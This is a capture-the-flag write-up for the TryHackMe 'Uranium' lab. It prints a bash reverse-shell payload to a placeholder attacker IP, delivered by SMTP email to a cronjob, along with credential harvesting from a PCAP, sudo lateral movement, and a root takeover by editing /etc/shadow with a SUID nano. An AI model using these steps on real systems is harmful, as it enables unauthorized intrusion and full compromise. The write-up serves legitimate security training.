# Uranium CTF — TryHackMe (Hard)

**Platform:** TryHackMe  
**Difficulty:** Hard  
**Category:** Cronjobs, Services, Privilege Escalation  

---

## Room Overview

> "In this room, you will learn about one of the attack methods. I tried to design a room (cronjobs and services) as much as I could."  
> Special Thanks to **kral4** for helping make this room.

The room involves exploiting an SMTP mail service, abusing cronjobs for a reverse shell, analyzing a PCAP file, and escalating privileges to root via a misconfigured SUID binary.

---

## Tools Used

- `rustscan` — Port scanning
- `sendEmail` — Sending crafted emails via SMTP
- `netcat (nc)` — Reverse shell listener
- `Wireshark` / `strings` — PCAP analysis
- `python3 http.server` / `wget` — File transfer
- `openssl` — Password hash generation
- `nano` (SUID binary) — Privilege escalation

---

## Step 1: Enumeration

Ran a fast port scan using RustScan:

```bash
rustscan -a <TARGET_IP> -- -sC -sV -A
```

**Open Ports Found:**

| Port | Service |
|------|---------|
| 22   | SSH     |
| 25   | SMTP    |
| 80   | HTTP    |

Also discovered a Twitter/X account associated with the target employee: **hakanbey**, who is running an email service on the machine.

---

## Step 2: Initial Access — SMTP Phishing + Reverse Shell

Since port 25 (SMTP) was open and the target user was known, we crafted a malicious email with a reverse shell payload.

**Create the payload file (`application.txt`):**

```bash
bash -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"
```

**Send the email using `sendEmail`:**

```bash
sendEmail -t hakanbey@uranium.thm \
          -f cheems@mail.com \
          -s <TARGET_IP> \
          -u "Hemlo" \
          -m "Surprise for you" \
          -o tls=no \
          -a application.txt
```

**Start the reverse shell listener:**

```bash
nc -lvnp 4444
```

A cronjob running every minute executed the payload, granting us a reverse shell as `hakanbey`.

---

## Step 3: Flag 1 — user_1.txt

After landing the shell, found the first flag in the home directory:

```bash
cat user_1.txt
# THM{REDACTED}
```

Files present in the home directory:

```
chat_with_kral4
mail_file
user_1.txt
```

---

## Step 4: PCAP Analysis — Finding the Password

The `chat_with_kral4` binary required a password. We found a network log file:

```bash
cd /var/log
ls
# hakanbey_network_log.pcap
```

**Transfer the file to local machine:**

On target:
```bash
python3 -m http.server 8000
```

On local machine:
```bash
wget http://<TARGET_IP>:8000/hakanbey_network_log.pcap
```

**Extract credentials using strings:**

```bash
strings hakanbey_network_log.pcap | grep -i -A5 -B5 "kral4\|password"
```

**Password found:** `MBMD1vdpjg3kGv6SsIz56***` *(redacted)*

---

## Step 5: Chatting with kral4

Used the found password to run `./chat_with_kral4`. Through the chat, we extracted `hakanbey`'s SSH password:

```
kral4: okay your password is Mys3cr3tp — don't lose it PLEASE
```

---

## Step 6: SSH as hakanbey + Lateral Movement to kral4

```bash
ssh hakanbey@<TARGET_IP>
# password: Mys3cr3tp

sudo -l
# (kral4) NOPASSWD: /bin/bash

sudo -u kral4 /bin/bash
# Now we are kral4!
```

---

## Step 7: Web Flag

As `kral4`, enumerated SUID binaries and searched for the web flag:

```bash
find / -type f -perm -u=s 2>/dev/null
find / -type f -name web_flag.txt 2>/dev/null
```

Used `dd` to read the protected web flag:

```bash
/bin/dd if=/var/www/html/web_flag.txt
# THM{REDACTED}
```

---

## Step 8: Root Privilege Escalation via nano SUID

Found a `nano` binary in kral4's home directory with SUID permissions.

**Generate a password hash:**

```bash
openssl passwd -6 P@ssword123!
# $6$Yp0vvYuRcKVKKE2B$Nw11sDp...
```

**Edit `/etc/shadow` using the SUID nano:**

```bash
./nano /etc/shadow
# Replace root's password hash with the one generated above
```

**Switch to root:**

```bash
su root
# Password: P@ssword123!
```

---

## Step 9: Root Flag

```bash
cat /root/root.txt
# THM{REDACTED}
```

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Port scan | Found SSH, SMTP, HTTP |
| 2 | SMTP phishing + cronjob | Reverse shell as `www-data`/`hakanbey` |
| 3 | Home directory | Flag 1 (`user_1.txt`) |
| 4 | PCAP analysis | Password for `chat_with_kral4` |
| 5 | Chat binary | SSH password for `hakanbey` |
| 6 | sudo lateral move | Shell as `kral4` |
| 7 | dd SUID abuse | Web flag |
| 8 | nano SUID + shadow edit | Root access |
| 9 | Root shell | Root flag |

---

## Key Takeaways

- SMTP services with known usernames are a prime phishing/payload delivery vector
- Cronjobs running as privileged users can be abused for persistence and initial access
- PCAP files in log directories can leak plaintext credentials
- SUID binaries like `dd` and `nano` are classic GTFOBins escalation paths
- Always run `find / -type f -perm -u=s 2>/dev/null` during enumeration

---

*Writeup by [your username] | TryHackMe: [your profile link]*
